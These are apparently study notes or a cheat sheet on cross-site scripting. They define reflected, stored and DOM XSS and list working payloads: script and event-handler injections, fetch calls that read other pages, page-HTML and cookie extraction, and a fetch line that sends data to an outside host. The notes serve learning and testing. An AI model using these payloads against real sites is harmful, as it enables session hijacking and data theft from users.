TYPES OF XSS
1. Reflected XSS
   - Payload comes from the request (URL/form).
   - Runs immediately when the victim opens the crafted link.

2. Stored XSS
   - Payload is saved on the server (post/comment/profile).
   - Executes whenever another user views the page.

3. DOM XSS
   - JavaScript on the page reads untrusted data and inserts it into the DOM.

GOALS OF XSS
- Read page contents.
- Perform actions as the victim.
- Send requests using the victim's session.
- Steal sensitive data (if protections don't prevent it).

COMMON HTML TAGS
<script>...</script>
<img ...>
<svg ...>
<body ...>



Basic alert
<script>alert(1)</script>

Image onerror
<img src=x onerror=alert(1)>

SVG onload
<svg onload=alert(1)>

Fetch a page
fetch("/")

Read response
fetch("/")
.then(r=>r.text())
.then(console.log)

Read another page
fetch("/draft")
.then(r=>r.text())
.then(console.log)

Send data somewhere
fetch("https://example.com/?d="+encodeURIComponent(data))

Extract page HTML
document.documentElement.innerHTML

Extract body
document.body.innerHTML

Extract text
document.body.innerText

Redirect browser
location="/"

Current URL
location.href

Cookie (if not HttpOnly)
document.cookie


IMPORTANT FUNCTIONS

fetch()
.then()
.text()
document.body.innerHTML
document.documentElement.innerHTML
encodeURIComponent()
location.href
console.log()


Stored XSS = payload saved on server.
Reflected XSS = payload in request.
DOM XSS = client-side JavaScript vulnerability.

JavaScript runs with the victim's permissions, not yours.
